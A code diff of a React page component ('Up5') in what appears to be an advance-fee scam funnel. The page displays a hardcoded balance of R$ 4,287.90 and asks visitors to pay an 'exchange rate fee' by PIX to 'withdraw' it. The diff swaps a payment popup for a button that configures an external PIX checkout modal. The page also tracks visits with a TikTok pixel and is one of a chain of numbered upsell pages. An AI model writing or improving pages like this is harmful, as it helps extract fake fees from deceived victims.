@@ -1,9 +1,6 @@
-import { useState, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
-import ParadisePixPopup from '@/components/ParadisePixPopup';
+import { useEffect } from 'react';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
-import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_ATUAL = 4287.90;
@@ -20,18 +17,9 @@ const formatBR = (value: number) => {
 };
 
 const Up5 = () => {
-  const navigate = useNavigate();
-  const [showPixPopup, setShowPixPopup] = useState(false);
-  const { customer } = useCustomerData();
-
   useEffect(() => {
     trackViewContent('Taxa de Câmbio', TAXA_CAMBIO);
   }, []);
-
-  const handlePaymentSuccess = () => {
-    setShowPixPopup(false);
-    navigate('/up6');
-  };
 
   return (
     <PageTransition>
@@ -108,27 +96,33 @@ const Up5 = () => {
           </p>
 
           <button
-            onClick={() => setShowPixPopup(true)}
-            className="cta-button cta-primary cta-rounded"
+            className="paradise-upsell-btn"
+            style={{
+              backgroundColor: '#f22b54',
+              color: '#ffffff',
+              padding: '12px 20px',
+              border: 'none',
+              borderRadius: '6px',
+              fontSize: '16px',
+              fontWeight: 'bold',
+              cursor: 'pointer',
+              width: '100%',
+            }}
+            data-offer-hash="upsell_2efbf5e961ccadbe"
+            data-modal-title="Pague a taxa de Câmbio e Receba"
+            data-copy-button-text="Copiar Código PIX"
+            data-modal-bg="#ffffff"
+            data-modal-title-color="#1f2937"
+            data-modal-btn-color="#28a745"
+            data-modal-btn-text-color="#ffffff"
           >
-            PAGAR TAXA DE CÂMBIO E SACAR R$ {formatBR(SALDO_CONVERTIDO)}
+            PAGAR TAXA DE CÂMBIO E SACAR
           </button>
 
           <p className="cta-footnote">
             Valor da taxa de conversão: R$ {formatBR(TAXA_CAMBIO)}
           </p>
         </div>
-
-        {showPixPopup && (
-          <ParadisePixPopup
-            amount={TAXA_CAMBIO_CENTAVOS}
-            description="Taxa de Câmbio Oficial"
-            productHash={PRODUCT_HASH}
-            customer={customer}
-            onSuccess={handlePaymentSuccess}
-            onClose={() => setShowPixPopup(false)}
-          />
-        )}
       </main>
     </PageTransition>
   );
